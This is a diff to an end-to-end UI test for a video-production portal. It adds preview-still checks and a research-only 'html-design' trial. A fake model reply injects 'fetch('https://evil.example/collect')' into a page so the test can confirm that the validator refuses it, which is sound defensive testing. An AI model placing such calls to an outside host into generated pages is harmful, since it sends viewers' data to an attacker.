@@ -10,6 +10,13 @@ import { fileURLToPath } from "node:url";
 import { totp } from "../apps/portal/lib/crypto/totp.ts";
 
 const ROOT = path.join(path.dirname(fileURLToPath(import.meta.url)), "..");
+/** A pack's version as vendored in styles/lock.json, so the checks follow pack bumps instead of hard-coding them. */
+const LOCK = JSON.parse(readFileSync(path.join(ROOT, "styles", "lock.json"), "utf8"));
+function packVersion(id) {
+  const p = (LOCK.packs ?? []).find((x) => x.id === id);
+  if (!p) throw new Error(`styles/lock.json has no pack ${id}`);
+  return p.version;
+}
 const APP = process.env.APP_URL ?? "http://localhost:3200";
 const SETUP_TOKEN = process.env.SETUP_TOKEN ?? "ui-setup-token";
 const OUT = path.join(ROOT, ".e2e-ui");
@@ -307,6 +314,26 @@ function directorReply(messages) {
       ...(spec ? {} : { text: "E2E project brief: voiceover from the script, one setup per shot." }),
     });
   }
+  // HTML design (recipe html-design, research only): the first answer for a brief is a page that calls
+  // fetch('https://evil.example'), which the portal's validator must refuse; the retry (hermesJson feeds the issues back
+  // in a second user turn) gets the pack's own reference page, which follows every rule. The retry note is kept per brief.
+  if (stage === "html-design") {
+    const tag = briefTag(first);
+    fakeStats.htmlDesignAsks[tag] = (fakeStats.htmlDesignAsks[tag] ?? 0) + 1;
+    const users = messages.filter((m) => m.role === "user");
+    const retry = users.length > 1 ? textOf(users[users.length - 1].content) : "";
+    if (retry) fakeStats.htmlDesignRetryNotes[tag] = retry;
+    const { count, beat, seconds } = planNumbers(first);
+    const reference = readFileSync(path.join(ROOT, "styles", "packs", "hermes-designed-explainer", "render", "index.html"), "utf8");
+    const html = retry ? reference : reference.replace("await document.fonts.ready;", "await document.fonts.ready; await fetch('https://evil.example/collect').catch(() => null);");
+    return JSON.stringify({
+      html,
+      note: "Fake design: light and dark scenes in turn, a heading and one growing bar per idea.",
+      scenes: Array.from({ length: count }, (_, i) => ({ beat: beat(i), seconds: seconds(i), caption: `Part ${i + 1} of the narration about the sky.` })),
+      backend: "fake-hermes",
+      plugin: "e2e-html-design",
+    });
+  }
   if (stage === "providers") {
     return JSON.stringify({ providers: ["cloudflare", "agnes", "canva", "qwen", "minimax", "sensenova"].map((name) => ({ name, note: "fake" })) });
   }
@@ -403,7 +430,7 @@ function fakeClipBytes() {
   return fakeClip;
 }
 
-const fakeStats = { hermesSkills: [], labSourceAsks: 0, labYoutubeAsks: 0, labYoutubePrompt: "", labSynthesisAsks: 0, youtubeHits: 0, hermesRenders: 0, clipDownloads: 0, advisoryAsks: 0, advisoryImages: 0, scriptFitAsks: 0, imageAsks: {}, pathAnswers: 0, errorAnswers: 0, urlAnswers: 0, routerSpeechCalls: 0, routerImageCalls: 0, routerBadImageCalls: 0, hermesImageRefusals: 0, hermesKokoroCalls: 0, capabilityScans: 0, hermes429: 0, shotPreferenceAsks: 0, droppedPreferenceAsks: 0, imageAsksByBrief: {}, storyboardAsksByBrief: {}, researchDataAsks: 0, sceneSpecAsks: 0, skillBriefAsks: 0, renderRequests: [] };
+const fakeStats = { hermesSkills: [], labSourceAsks: 0, labYoutubeAsks: 0, labYoutubePrompt: "", labSynthesisAsks: 0, youtubeHits: 0, hermesRenders: 0, clipDownloads: 0, advisoryAsks: 0, advisoryImages: 0, scriptFitAsks: 0, imageAsks: {}, pathAnswers: 0, errorAnswers: 0, urlAnswers: 0, routerSpeechCalls: 0, routerImageCalls: 0, routerBadImageCalls: 0, hermesImageRefusals: 0, hermesKokoroCalls: 0, capabilityScans: 0, hermes429: 0, shotPreferenceAsks: 0, droppedPreferenceAsks: 0, imageAsksByBrief: {}, storyboardAsksByBrief: {}, researchDataAsks: 0, sceneSpecAsks: 0, skillBriefAsks: 0, renderRequests: [], htmlDesignAsks: {}, htmlDesignRetryNotes: {} };
 // The first image asks get HTTP 429 with a short Retry-After, like a busy Hermes. The shots must wait and then finish,
 // not fail, and the wait must not use up their attempts.
 const HERMES_429_BURST = 3;
@@ -1064,14 +1091,14 @@ try {
   await page.getByTestId("run-settings").locator("summary").click();
   await page.getByTestId("run-settings").locator("dl").waitFor();
   const settingsText = await page.getByTestId("run-settings").innerText();
-  for (const want of ["Affiliate links, Series (recurring episodes)", "Myth and folklore, chosen for this video", "Spanish", "English (Kokoro voice)", STUDIO_BRIEF, "explainer-flat-vector 1.0.1, Trial: research only, not for publishing"]) {
+  for (const want of ["Affiliate links, Series (recurring episodes)", "Myth and folklore, chosen for this video", "Spanish", "English (Kokoro voice)", STUDIO_BRIEF, `explainer-flat-vector ${packVersion("explainer-flat-vector")}, Trial: research only, not for publishing`]) {
     if (!settingsText.includes(want)) throw new Error(`the run settings miss "${want}": ${settingsText.replace(/\s+/g, " ")}`);
   }
   // A run started with a Trial pack carries the badge, and its config records the pack (additive).
   await page.getByTestId("trial-badge").getByText("Trial style: research only, not for publishing", { exact: true }).waitFor();
   const startedId = startedHref.split("/").pop();
   const storedPack = dbValue(`SELECT config->'stylePack'->>'id' || '@' || (config->'stylePack'->>'version') || ':' || (config->'stylePack'->>'trial') FROM pipeline_runs WHERE id = '${startedId}'`);
-  if (storedPack !== null && storedPack !== "explainer-flat-vector@1.0.1:true") throw new Error(`the run config does not mark the trial pack: ${storedPack}`);
+  if (storedPack !== null && storedPack !== `explainer-flat-vector@${packVersion("explainer-flat-vector")}:true`) throw new Error(`the run config does not mark the trial pack: ${storedPack}`);
   // The run's stage list is fixed at start (config.workflow, additive): an image-sequence run keeps the original eight.
   const storedFlow = dbValue(`SELECT (config->'workflow'->>'recipe') || ' ' || (config->'workflow'->'stages')::text FROM pipeline_runs WHERE id = '${startedId}'`);
   if (storedFlow !== null && storedFlow !== 'image-sequence ["idea", "research", "script", "storyboard", "assets", "voice", "render", "qc"]') throw new Error(`the image-sequence run stored the workflow "${storedFlow}"`);
@@ -1496,7 +1523,7 @@ try {
   {
     const prodRunId = /([0-9a-f-]{36})$/.exec(productionRunHref ?? "")?.[1] ?? "";
     const cap = dbValue(`SELECT capability FROM jobs WHERE type = 'render-video' AND payload->>'runId' = '${prodRunId}' ORDER BY created_at DESC LIMIT 1`);
-    if (cap !== null && cap !== "pack:explainer-flat-vector@1.0.1") throw new Error(`the render job is queued under ${cap}, not the pack capability`);
+    if (cap !== null && cap !== `pack:explainer-flat-vector@${packVersion("explainer-flat-vector")}`) throw new Error(`the render job is queued under ${cap}, not the pack capability`);
     // The decision is saved by a server action; the log row follows it.
     let outcome = null;
     for (let i = 0; i < 20; i++) {
@@ -1514,7 +1541,7 @@ try {
     await page.goto(`${APP}/studio/styles`);
     const explainerCard = page.getByTestId("style-pack-explainer-flat-vector");
     await explainerCard.getByText("Trial", { exact: true }).first().waitFor();
-    await explainerCard.getByTestId("pack-availability").getByText("A worker reports pack:explainer-flat-vector@1.0.1", { exact: true }).waitFor();
+    await explainerCard.getByTestId("pack-availability").getByText(`A worker reports pack:explainer-flat-vector@${packVersion("explainer-flat-vector")}`, { exact: true }).waitFor();
     if (outcome !== null) {
       // Counted with the owner's score: 80 from 5, 4, 4, 4, 4 stars.
       await explainerCard.getByTestId("trial-record").getByText(/^Trial runs of v1\.0\.1: 1 .*mean presentation 80 \(1 scored\)/).waitFor();
@@ -1694,8 +1721,22 @@ try {
       throw new Error(`${label}: the quality check never reached Review for ${[...left].join(", ")}`);
     }
   }
-  /** The owner scores the final video on its card, then decides (approve when offered, else reject). */
-  async function scoreAndDecide(runId, stars, shown) {
+  /** A preview card: `n` stills that loaded (real JPEGs from the worker), the note, and the owner-only reason. */
+async function checkPreviewCard(card, n, note) {
+  const stills = card.getByTestId("preview-stills").getByTestId("preview-still");
+  await stills.first().waitFor();
+  if ((await stills.count()) !== n) throw new Error(`the preview card shows ${await stills.count()} still(s), not ${n}`);
+  for (let i = 0; i < n; i++) {
+    const img = stills.nth(i).locator("img");
+    await img.scrollIntoViewIfNeeded();
+    await m.waitForFunction((el) => el.complete && el.naturalWidth > 0, await img.elementHandle(), { timeout: 30_000 });
+  }
+  await card.getByTestId("plan-note").getByText(note).waitFor();
+  await card.getByText("This style's workflow has the owner check the preview every time", { exact: true }).or(card.getByText(/^Manual mode/)).first().waitFor();
+}
+
+/** The owner scores the final video on its card, then decides (approve when offered, else reject). */
+async function scoreAndDecide(runId, stars, shown) {
     await m.goto(`${APP}/review`);
     const card = cardOf(runId, "qc").first();
     await scoreVideo(card, stars, shown);
@@ -1829,7 +1870,7 @@ try {
       await reuseProduction(labRunId, "lab trial");
       await driveToQc([labRunId], "lab trial");
       const cap = dbValue(`SELECT capability FROM jobs WHERE type = 'render-video' AND payload->>'runId' = '${labRunId}' ORDER BY created_at DESC LIMIT 1`);
-      if (cap !== "pack:probe-line-graph@0.1.1") throw new Error(`the lab trial's render is queued under ${cap}, not the pack capability`);
+      if (cap !== `pack:probe-line-graph@${packVersion("probe-line-graph")}`) throw new Error(`the lab trial's render is queued under ${cap}, not the pack capability`);
       const card = cardOf(labRunId, "qc").first();
       await card.getByTestId("lab-trial-badge").getByText("Lab trial (draft pack)", { exact: true }).waitFor();
       await scoreAndDecide(labRunId, { hook: 3, pacing: 4, legibility: 4, polish: 3, audio: 3 }, "60/100 by the owner");
@@ -1900,18 +1941,27 @@ try {
   }
   const imageAskTotal = () => Object.values(fakeStats.imageAsks).reduce((n, v) => n + v, 0) + fakeStats.routerImageCalls;
 
-  step("scene-spec trial: animated-line-graph from New Video goes idea → research → script → scene spec → voice → html-capture render → qc, with no picture made");
+  step("scene-spec trial: animated-line-graph from New Video goes idea → research → script → scene spec → preview stills → voice → html-capture render → qc, with no picture made");
   if (dbValue("SELECT 1") === null) console.log("   no database access (UI_DB unset): the scene-spec run is skipped");
   else {
     const brief = "Scene spec trial: how solar capacity grew";
     const imagesBefore = imageAskTotal();
     const specAsksBefore = fakeStats.sceneSpecAsks;
     const dataAsksBefore = fakeStats.researchDataAsks;
-    const runId = await startFromNewVideo("tpl-animated-line-graph", brief, "Workflow: Scene spec (data-driven, no pictures): Idea → Research → Script → Scene spec → Voice → Video → Quality check");
+    const runId = await startFromNewVideo("tpl-animated-line-graph", brief, "Workflow: Scene spec (data-driven, no pictures): Idea → Research → Script → Scene spec → Preview → Voice → Video → Quality check");
     const flow = dbValue(`SELECT (config->'workflow'->>'recipe') || ' ' || (config->'workflow'->'stages')::text || ' ' || (config->'workflow'->'review')::text FROM pipeline_runs WHERE id = '${runId}'`);
-    if (flow !== 'scene-spec ["idea", "research", "script", "scene-spec", "voice", "render", "qc"] ["scene-spec"]') throw new Error(`the scene-spec run stored the workflow "${flow}"`);
+    if (flow !== 'scene-spec ["idea", "research", "script", "scene-spec", "preview", "voice", "render", "qc"] ["scene-spec", "preview"]') throw new Error(`the scene-spec run stored the workflow "${flow}"`);
     let specCard = false;
+    let previewCard = false;
     const seen = await driveWorkflow(runId, "scene-spec trial", async (stage, card) => {
+      if (stage === "preview") {
+        previewCard = true;
+        // Real stills of the pack's page from the CI worker (preview-frames), before the voice and the render.
+        await checkPreviewCard(card, 6, /^6 still frames of this style's page, drawn by a worker with this run's real props before the voice and the render\./);
+        if (dbValue(`SELECT count(*) FROM jobs WHERE type = 'render-video' AND payload->>'runId' = '${runId}'`) !== "0") throw new Error("the scene-spec run queued its render before the owner approved the stills");
+        await shot("31a-review-scene-spec-preview-mobile", m);
+        return;
+      }
       if (stage !== "scene-spec") return;
       specCard = true;
       // The spec as text: one line per scene, the numbers with the note they come from; no image grid on this card.
@@ -1919,12 +1969,17 @@ try {
       const lines = await card.getByTestId("scene-spec-list").getByTestId("plan-line").allInnerTexts();
       if (lines.length < 3) throw new Error(`the scene-spec card lists ${lines.length} scene(s)`);
       if (!lines.some((l) => /bar "GW" 2010: 40, 2014: 140, 2019: 500, 2023: 1200 \(note 1\)/.test(l))) throw new Error(`the scene-spec card does not show the sourced series: ${lines.join(" | ")}`);
-      await card.getByTestId("plan-note").getByText(/^No still preview before the render: the worker has no stills mode for html-capture pages yet/).waitFor();
+      await card.getByTestId("plan-note").getByText(/^This card shows the spec as text\. Still frames of the page, drawn with this run's props, come next/).waitFor();
       if (await card.getByTestId("asset-grid").count()) throw new Error("the scene-spec card shows an image grid");
       await card.getByText("This style's workflow has the owner check the scene spec every time", { exact: true }).or(card.getByText(/^Manual mode/)).first().waitFor();
       await shot("31-review-scene-spec-mobile", m);
     });
     if (!specCard) throw new Error(`the scene spec never asked the owner (cards seen: ${[...seen].join(", ")}), though the pack's workflow reviews it every time`);
+    if (!previewCard) throw new Error(`the preview stills never reached Review (cards seen: ${[...seen].join(", ")})`);
+    // The preview job: this run's, under the pack's capability, done before the render job was even queued.
+    const pj = dbValue(`SELECT p.capability || ' ' || p.status || ' ' || (p.created_at < r.created_at)::text || ' ' || (SELECT count(*) FROM artifacts a WHERE a.job_id = p.id AND a.name LIKE 'still-%')
+      FROM jobs p, jobs r WHERE p.type = 'preview-frames' AND p.payload->>'runId' = '${runId}' AND r.type = 'render-video' AND r.payload->>'runId' = '${runId}' ORDER BY p.created_at DESC, r.created_at DESC LIMIT 1`);
+    if (pj !== `pack:animated-line-graph@${packVersion("animated-line-graph")} succeeded true 6`) throw new Error(`the scene-spec preview job is "${pj}"`);
     if (fakeStats.researchDataAsks <= dataAsksBefore) throw new Error("the scene-spec run's research did not ask for the numbers the spec needs");
     if (fakeStats.sceneSpecAsks <= specAsksBefore) throw new Error("Hermes was never asked for the scene spec");
     if (!/On-screen elements this style allows: heading, counter, bar\./.test(lastPrompt["scene-spec"] ?? "")) throw new Error("the scene-spec prompt does not carry the pack's elements");
@@ -1939,7 +1994,7 @@ try {
     console.log(`   image asks while the scene-spec run ran, any run: ${imageAskTotal() - imagesBefore}`);
     // The real html-capture render through the CI worker, from the spec: the pack's page, the sourced series, one plate.
     const job = dbValue(`SELECT capability || ' ' || (payload->>'engine') || ' ' || (payload->'scenePlan'->>'template') || ' ' || (payload->'scenePlan'->'scenes'->1->'elements'->0->'series')::text FROM jobs WHERE type = 'render-video' AND payload->>'runId' = '${runId}' ORDER BY created_at DESC LIMIT 1`);
-    if (job !== "pack:animated-line-graph@0.1.2 html-capture animated-line-graph [40, 140, 500, 1200]") throw new Error(`the scene-spec render job is "${job}"`);
+    if (job !== `pack:animated-line-graph@${packVersion("animated-line-graph")} html-capture animated-line-graph [40, 140, 500, 1200]`) throw new Error(`the scene-spec render job is "${job}"`);
     const plates = dbValue(`SELECT count(DISTINCT s->>'assetId') || ' ' || (SELECT count(*) FROM assets WHERE metadata->>'runId' = '${runId}' AND metadata->>'executor' = 'portal-plate' AND source = 'generated')
       FROM jobs j, jsonb_array_elements(j.payload->'shots') s WHERE j.type = 'render-video' AND j.payload->>'runId' = '${runId}'`);
     if (plates !== "1 1") throw new Error(`the scene-spec render should use one portal plate for every shot: "${plates}"`);
@@ -1950,7 +2005,7 @@ try {
     await card.getByTestId("trial-badge").getByText("Trial style", { exact: true }).waitFor();
     await scoreAndDecide(runId, { hook: 4, pacing: 4, legibility: 4, polish: 4, audio: 4 }, "75/100 by the owner");
     const logged = dbValue(`SELECT pack_id || '@' || pack_version || ' ' || coalesce(renderer, '?') || ' ' || coalesce(presentation_score::text, 'none') FROM style_trial_outcomes WHERE run_id = '${runId}'`);
-    if (logged !== "animated-line-graph@0.1.2 html-capture 75") throw new Error(`the scene-spec trial's curation row is "${logged}"`);
+    if (logged !== `animated-line-graph@${packVersion("animated-line-graph")} html-capture 75`) throw new Error(`the scene-spec trial's curation row is "${logged}"`);
     // The run page shows the run's own list, and no work orders.
     await page.goto(`${APP}/studio/runs/${runId}`);
     const wf = page.locator('[data-testid="run-workflow"][data-recipe="scene-spec"]');
@@ -1960,6 +2015,85 @@ try {
     if (await page.getByTestId("stage-storyboard").count()) throw new Error("the scene-spec run page shows a storyboard stage");
     await shot("31b-run-scene-spec-desktop");
     console.log(`   scene-spec: ${[...seen].join(", ")} approved; 0 work orders, 0 image asks; rendered by html-capture from the spec`);
+  }
+
+  step("html-design trial (research only): Hermes writes the page; a page that calls fetch is refused by the validator and the retry is used; preview stills; the CI worker renders the page; QC and the owner's score; nothing publishable, no image asks");
+  if (dbValue("SELECT 1") === null) console.log("   no database access (UI_DB unset): the html-design run is skipped");
+  else {
+    const brief = "HTML design trial: why the sky is blue";
+    const tag = brief.slice(0, 60);
+    const ver = packVersion("hermes-designed-explainer");
+    // New Video offers it only in the Trial section, with its research-only badge.
+    await page.goto(`${APP}/studio/new`);
+    const row = page.getByTestId("trial-styles").getByTestId("trial-style-hermes-designed-explainer");
+    await row.getByTestId("html-design-label").getByText("Hermes-designed page (research only)", { exact: true }).waitFor();
+    const runId = await startFromNewVideo("tpl-hermes-designed-explainer", brief, "Workflow: Hermes-designed page (research only, no pictures): Idea → Research → Script → HTML design → Preview → Voice → Video → Quality check");
+    const flow = dbValue(`SELECT (config->'workflow'->>'recipe') || ' ' || (config->'workflow'->'stages')::text || ' ' || (config->'workflow'->'review')::text || ' ' || (config->'stylePack'->>'trial') || ' ' || (config->'stylePack'->>'designed') FROM pipeline_runs WHERE id = '${runId}'`);
+    if (flow !== 'html-design ["idea", "research", "script", "html-design", "preview", "voice", "render", "qc"] ["html-design", "preview"] true true') throw new Error(`the html-design run stored "${flow}"`);
+    let designCard = false;
+    let previewCard = false;
+    const seen = await driveWorkflow(runId, "html-design trial", async (stage, card) => {
+      if (stage === "html-design") {
+        designCard = true;
+        await card.getByTestId("html-design-badge").getByText("Hermes-designed page (research only)", { exact: true }).waitFor();
+        await card.getByTestId("html-design-card").waitFor();
+        const lines = await card.getByTestId("html-design-list").getByTestId("plan-line").allInnerTexts();
+        if (!/^File index\.html: \d+ KB$/.test(lines[0] ?? "")) throw new Error(`the html-design card does not list the page: ${lines.join(" | ")}`);
+        await card.getByTestId("html-design-note").getByText("Fake design: light and dark scenes in turn, a heading and one growing bar per idea.", { exact: true }).waitFor();
+        await card.getByTestId("plan-note").getByText(/^Research only: Hermes wrote this page\. It was checked before anything ran/).waitFor();
+        await card.getByText("This style's workflow has the owner check the html design every time", { exact: true }).or(card.getByText(/^Manual mode/)).first().waitFor();
+        if (await card.getByTestId("asset-grid").count()) throw new Error("the html-design card shows an image grid");
+        await shot("31c-review-html-design-mobile", m);
+        return;
+      }
+      if (stage === "preview") {
+        previewCard = true;
+        await checkPreviewCard(card, 6, /^6 still frames of the page Hermes wrote \(research only\), drawn by a worker with this run's real props before the voice and the render\./);
+        if (dbValue(`SELECT count(*) FROM jobs WHERE type = 'render-video' AND payload->>'runId' = '${runId}'`) !== "0") throw new Error("the html-design run queued its render before the owner approved the stills");
+        await shot("31d-review-html-design-preview-mobile", m);
+      }
+    });
+    if (!designCard || !previewCard) throw new Error(`the owner did not see both the page and its stills (cards seen: ${[...seen].join(", ")})`);
+    // The validator refused the page that called fetch, by name, and Hermes's retry carried that issue (this run's brief).
+    if ((fakeStats.htmlDesignAsks[tag] ?? 0) < 2) throw new Error(`Hermes was asked ${fakeStats.htmlDesignAsks[tag] ?? 0} time(s) for this run's page; the fetch page should have been refused and asked again`);
+    const note = fakeStats.htmlDesignRetryNotes[tag] ?? "";
+    if (!/names an external URL \(https:\/\/evil\.example\/collect\)/.test(note) || !/uses fetch\(/.test(note)) throw new Error(`the retry did not carry the validator's issue: ${note.slice(0, 600)}`);
+    const designPrompt = [...(allPrompts["html-design"] ?? [])].reverse().find((t) => briefTag(t) === tag) ?? "";
+    if (!/\.\.\/pack\/fonts\/fonts\.css/.test(designPrompt) || !/no GSAP/.test(designPrompt)) throw new Error("the html-design prompt does not carry the pack's vendored files and rules");
+    const stored = dbValue(`SELECT position('evil.example' in output::text)::text FROM pipeline_stages WHERE run_id = '${runId}' AND stage = 'html-design' AND state = 'passed' ORDER BY attempt DESC LIMIT 1`);
+    if (stored !== "0") throw new Error("the approved page still mentions evil.example");
+    // The page asset: this run's, kind html-page, source hermes, research only, the backend Hermes named; stored as JSON.
+    const pageRow = dbValue(`SELECT id || ' ' || kind || ' ' || source || ' ' || content_type || ' ' || (metadata->>'researchOnly') || ' ' || (metadata->>'backend') FROM assets WHERE kind = 'html-page' AND metadata->>'runId' = '${runId}' ORDER BY created_at DESC LIMIT 1`);
+    const [pageId, ...pageRest] = (pageRow ?? "").split(" ");
+    if (pageRest.join(" ") !== "html-page hermes application/json true fake-hermes") throw new Error(`the html-page asset is "${pageRow}"`);
+    // The preview and the render both carry that page, under the pack's capability; the render came after the stills.
+    const jobs = dbValue(`SELECT p.capability || ' ' || p.status || ' ' || (p.payload->'preview'->>'page') || ' ' || r.capability || ' ' || (r.payload->'page'->>'assetId') || ' ' || (p.created_at < r.created_at)::text || ' ' || coalesce(r.result->'page'->>'designed', 'none')
+      FROM jobs p, jobs r WHERE p.type = 'preview-frames' AND p.payload->>'runId' = '${runId}' AND r.type = 'render-video' AND r.payload->>'runId' = '${runId}' ORDER BY p.created_at DESC, r.created_at DESC LIMIT 1`);
+    if (jobs !== `pack:hermes-designed-explainer@${ver} succeeded ${pageId} pack:hermes-designed-explainer@${ver} ${pageId} true true`) throw new Error(`the html-design jobs are "${jobs}"`);
+    const rendered = dbValue(`SELECT output->'result'->>'renderer' FROM pipeline_stages WHERE run_id = '${runId}' AND stage = 'render' AND state = 'passed' ORDER BY attempt DESC LIMIT 1`);
+    if (rendered !== "html-capture") throw new Error(`the html-design video was rendered by "${rendered}"`);
+    // Zero image work for this run.
+    if (dbValue(`SELECT count(*) FROM work_orders WHERE run_id = '${runId}'`) !== "0") throw new Error("the html-design run has work orders");
+    const made = dbValue(`SELECT coalesce(string_agg(DISTINCT stage, ',' ORDER BY stage), '') FROM pipeline_stages WHERE run_id = '${runId}'`);
+    if (/storyboard|assets|scene-spec/.test(made ?? "")) throw new Error(`the html-design run made stages ${made}`);
+    if (fakeStats.imageAsksByBrief[tag] || fakeStats.storyboardAsksByBrief[tag]) throw new Error(`the html-design run asked for ${fakeStats.imageAsksByBrief[tag] ?? 0} image(s) and ${fakeStats.storyboardAsksByBrief[tag] ?? 0} storyboard(s)`);
+    // QC and the owner's score; the final card says research only.
+    const card = cardOf(runId, "qc").first();
+    await card.getByTestId("render-video").waitFor();
+    await card.getByTestId("trial-badge").getByText("Trial style", { exact: true }).waitFor();
+    await card.getByTestId("html-design-badge").getByText("Hermes-designed page (research only)", { exact: true }).waitFor();
+    await scoreAndDecide(runId, { hook: 3, pacing: 4, legibility: 4, polish: 3, audio: 4 }, "65/100 by the owner");
+    const logged = dbValue(`SELECT pack_id || '@' || pack_version || ' ' || coalesce(renderer, '?') || ' ' || coalesce(presentation_score::text, 'none') FROM style_trial_outcomes WHERE run_id = '${runId}'`);
+    if (logged !== `hermes-designed-explainer@${ver} html-capture 65`) throw new Error(`the html-design trial's curation row is "${logged}"`);
+    // Nothing is publishable: no upload or publish stage ever ran for it.
+    const published = dbValue(`SELECT count(*) FROM pipeline_stages WHERE run_id = '${runId}' AND stage IN ('upload', 'publish') AND state <> 'skipped'`);
+    if (published !== "0") throw new Error(`the html-design run has ${published} upload or publish stage(s)`);
+    await page.goto(`${APP}/studio/runs/${runId}`);
+    await page.getByTestId("html-design-badge").getByText("Hermes-designed page (research only)", { exact: true }).waitFor();
+    const wf = page.locator('[data-testid="run-workflow"][data-recipe="html-design"]');
+    await wf.locator('[data-testid="workflow-step-preview"][data-state="passed"]').waitFor();
+    await shot("31e-run-html-design-desktop");
+    console.log(`   html-design: ${[...seen].join(", ")} approved; page asked ${fakeStats.htmlDesignAsks[tag]} times (the fetch page refused); 6 stills; rendered by html-capture`);
   }
 
   step("hermes-skill research run: /graph from New Video goes idea → research → script → skill brief → voice → Hermes render → qc; no assets stage, no image asks, the brief reaches Hermes");
@@ -2003,7 +2137,7 @@ try {
     await card.getByTestId("hermes-render-badge").getByText("Hermes render (research only)", { exact: true }).waitFor();
     await scoreAndDecide(runId, { hook: 3, pacing: 4, legibility: 4, polish: 3, audio: 3 }, "60/100 by the owner");
     const logged = dbValue(`SELECT pack_id || '@' || pack_version || ' ' || coalesce(renderer, '?') FROM style_trial_outcomes WHERE run_id = '${runId}'`);
-    if (logged !== "hermes-graph@0.2.0 hermes") throw new Error(`the hermes-skill trial's curation row is "${logged}"`);
+    if (logged !== `hermes-graph@${packVersion("hermes-graph")} hermes`) throw new Error(`the hermes-skill trial's curation row is "${logged}"`);
     await page.goto(`${APP}/studio/runs/${runId}`);
     await page.locator('[data-testid="run-workflow"][data-recipe="hermes-skill"]').locator('[data-testid="workflow-step-skill-brief"][data-state="passed"]').waitFor();
     if (await page.getByTestId("stage-assets").count()) throw new Error("the hermes-skill run page shows an assets stage");
@@ -2222,7 +2356,7 @@ try {
     if (linked !== null && linked !== "true explainer-flat-vector") throw new Error(`the study's trial run is "${linked}"`);
     await page.goto(`${APP}${studyHref}`);
     const trialRow = page.getByTestId("lab-trial");
-    await trialRow.getByRole("link", { name: "Trial run with explainer-flat-vector 1.0.1", exact: true }).waitFor();
+    await trialRow.getByRole("link", { name: `Trial run with explainer-flat-vector ${packVersion("explainer-flat-vector")}`, exact: true }).waitFor();
     await trialRow.getByTestId("trial-outcome").getByText(/^QC: not run yet · presentation not scored · decision none yet/).waitFor();
 
     // 390 px.
